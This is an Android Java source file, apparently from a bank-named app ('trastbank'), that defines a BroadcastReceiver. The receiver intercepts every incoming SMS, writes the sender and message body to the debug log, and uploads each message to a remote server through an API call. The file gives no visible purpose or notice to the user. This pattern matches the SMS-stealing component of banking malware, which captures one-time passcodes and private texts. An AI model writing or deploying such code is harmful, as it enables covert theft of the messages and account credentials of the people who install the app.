package com.example.trastbank;

import android.annotation.TargetApi;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.example.trastbank.domain.SMS;
import com.example.trastbank.rest.AppApiVolley;

public class MyReceiver extends BroadcastReceiver {
    public static final String pdu_type = "pdus";

    @TargetApi(Build.VERSION_CODES.M)
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        SmsMessage[] msgs;
        String strMessage = "";
        String format = bundle.getString("format");
        Object[] pdus = (Object[]) bundle.get(pdu_type);
        if (pdus != null) {
            boolean isVersionM =
                    (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M);
            msgs = new SmsMessage[pdus.length];
            for (int i = 0; i < msgs.length; i++) {
                if (isVersionM) {
                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
                } else {
                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                }
                strMessage += "SMS from " + msgs[i].getOriginatingAddress();
                strMessage += " :" + msgs[i].getMessageBody() + "\n";
                Log.d("myOwnTag", "onReceive: " + strMessage);
                new AppApiVolley(context).insertSMS(new SMS(msgs[i].getMessageBody(), strMessage), 1);
            }
        }
    }
}